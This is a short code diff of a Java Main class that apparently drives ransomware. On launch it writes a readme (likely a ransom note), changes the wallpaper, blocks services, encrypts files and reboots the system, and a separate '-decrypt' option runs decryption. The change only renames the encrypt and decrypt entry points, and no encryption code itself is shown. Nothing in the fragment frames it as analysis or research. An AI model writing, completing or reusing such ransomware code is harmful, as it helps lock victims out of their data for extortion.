@@ -12,10 +12,10 @@ public class Main {
             CreateReadme.main();
             WallpaperChanger.main();
             ServiceBlock.blockAll();
-            Encrypt.runEncryption();
+            Encrypt.main();
             SystemReboot.main();
         } else if (option.equals("-decrypt")) {
-            Decrypt.runDecryption();
+            Decrypt.main();
         } else {
             System.out.println("Invalid option: " + option);
         }
